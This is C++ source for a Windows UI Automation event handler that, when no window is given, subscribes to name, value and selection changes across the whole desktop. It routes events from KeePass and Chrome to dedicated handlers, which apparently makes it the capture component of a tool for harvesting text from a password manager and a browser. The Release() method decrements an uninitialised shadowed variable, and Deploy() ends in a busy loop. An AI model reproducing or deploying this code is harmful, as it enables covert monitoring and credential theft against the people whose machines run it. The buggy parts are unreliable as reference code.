#include "ChangedEventHandler.h"
#include "Logger.h"
#include "Finder.h"
#include "Errors.h"
#include "Helpers.h"
#include "start.h"

MyPropertyChangedEventHandler::MyPropertyChangedEventHandler() : refCount(1), eventCount(0)
{
}

ULONG STDMETHODCALLTYPE MyPropertyChangedEventHandler::AddRef()
{
	return InterlockedIncrement(&refCount);
}

ULONG STDMETHODCALLTYPE MyPropertyChangedEventHandler::Release()
{
	ULONG refCount = InterlockedDecrement(&refCount);
	if (refCount == 0)
	{
		delete this;
		return 0;
	}
	return refCount;
}

ULONG STDMETHODCALLTYPE MyPropertyChangedEventHandler::GetEventCount()
{
	return eventCount;
}

VOID STDMETHODCALLTYPE MyPropertyChangedEventHandler::IncrementEventCount()
{
	InterlockedIncrement(&eventCount);
}

HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::QueryInterface(REFIID riid, void** ppInterface)
{
	if (riid == __uuidof(IUnknown))
		*ppInterface = static_cast<IUnknown*>(this);
	else if (riid == __uuidof(IUIAutomationPropertyChangedEventHandler))
		*ppInterface = static_cast<IUIAutomationPropertyChangedEventHandler*>(this);
	else
	{
		*ppInterface = NULL;
		return E_NOINTERFACE;
	}
	this->AddRef();
	return S_OK;
}

void STDMETHODCALLTYPE MyPropertyChangedEventHandler::SetEventTimeout(int seconds)
{
	this->eventTimeout = std::chrono::seconds(seconds);
}

std::chrono::seconds MyPropertyChangedEventHandler::GetEventTimeout()
{
	return this->eventTimeout;
}

HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::HandlePropertyChangedEvent(IUIAutomationElement* pAutomationElement, PROPERTYID propId, VARIANT vVar)
{
	//Log(L"Property changed", DBG);

	// checks time
	auto now = std::chrono::steady_clock::now();

	if (now - lastEventTime < GetEventTimeout())
	{
		//Log(L"Too fast events...", DBG);
		return ERROR_SUCCESS;
	}

	lastEventTime = now;

	// checks new value
	HRESULT hr = ERROR_SUCCESS;
	if ((propId == UIA_NamePropertyId || propId == UIA_ValueValuePropertyId) && vVar.vt == VT_EMPTY)
	{
		return S_OK;
	}

	if (vVar.vt == VT_BSTR && (std::wstring(vVar.bstrVal) == oldTextValue) &&
		(propId == UIA_NamePropertyId || propId == UIA_ValueValuePropertyId))
	{
		return S_OK;
	}

	if (vVar.vt == VT_BSTR)
		oldTextValue = std::wstring(vVar.bstrVal);

	DWORD pid = Finder::GetPIDByUIAutomationElement(pAutomationElement);

	if (pid == -1)
	{
		Log(L"MyAutomationEventHandler::HandleAutomationEvent() invalid PID Received", DBG);
		return ERROR_SUCCESS;
	}

	std::wstring wsFileName = Finder::GetModuleNameFromPid(pid);
	if (wsFileName.empty())
	{
		Log(L"MyAutomationEventHandler::HandleAutomationEvent() invalid wsProcName Received", DBG);
		return ERROR_SUCCESS;
	}


	IncrementEventCount();
	std::wstring wsProcName = Helpers::GetApplicationName(wsFileName);
	std::wstring wsDate = Helpers::GetCurrentDateTime();

	Log(L"New property event from " + wsProcName + L" Time: " + wsDate, DBG);

	if (g_IgnoreHandlers)
	{
		HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar);
	}
	else {
		std::unordered_map<std::wstring, std::function<void()>> handlers = {
			{ L"keepass.exe", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleKeepass(pAutomationElement, wsProcName, wsDate, propId, vVar); } },
			{ L"chrome.exe", [this, pAutomationElement, wsProcName, wsDate, propId, vVar]() { HandleChrome(pAutomationElement, wsProcName, wsDate, propId, vVar); } },
		};

		auto it = handlers.find(Helpers::ConvertToLower(wsProcName));

		if (it != handlers.end()) {
			it->second();
		}
		else {
			HandleOther(pAutomationElement, wsProcName, wsDate, propId, vVar);
		}
	}

	return S_OK;
}

HRESULT STDMETHODCALLTYPE MyPropertyChangedEventHandler::Deploy(IUIAutomation* pAutomation, IUIAutomationElement* pAutomationElement, int timeout)
{
	MyPropertyChangedEventHandler* pMyPropertyChangedEventHandler = new MyPropertyChangedEventHandler();

	pMyPropertyChangedEventHandler->SetEventTimeout(timeout);

	HRESULT hr;
	BSTR bName;

	if (!pAutomationElement)
	{
		Log(L"Monitoring from root", INFO);
		pAutomation->GetRootElement(&pAutomationElement);
	}

	hr = pAutomationElement->get_CurrentName(&bName);

	if (SUCCEEDED(hr))
	{
		std::wstring wname(bName, SysStringLen(bName));
		Log(L"Window Name: " + wname, INFO);
	}

	SysFreeString(bName);


	// don't forget about adding property handling in "MyPropertyChangedEventHandlerApps.cpp"
	std::vector<int> propertyIds = {
		UIA_NamePropertyId,
		UIA_ValueValuePropertyId,
		UIA_SelectionItemIsSelectedPropertyId,
	};


	SAFEARRAY* propertyArray = SafeArrayCreateVector(VT_I4, 0, propertyIds.size());
	if (!propertyArray)
	{
		Log(L"Can't create property arrray", WARNING);
		return E_ABORT;
	}

	for (size_t i = 0; i < propertyIds.size(); i++)
	{
		long index = static_cast<long>(i);
		SafeArrayPutElement(propertyArray, &index, &propertyIds[i]);
	}

	hr = pAutomation->AddPropertyChangedEventHandler(pAutomationElement, TreeScope_Subtree, NULL, pMyPropertyChangedEventHandler, propertyArray);

	if (FAILED(hr)) {
		Log(L"Failed to add property changed event handler" , WARNING);
		PrintErrorFromHRESULT(hr);
		return E_ABORT;
	}

	while (1){};
	return ERROR_SUCCESS;
}
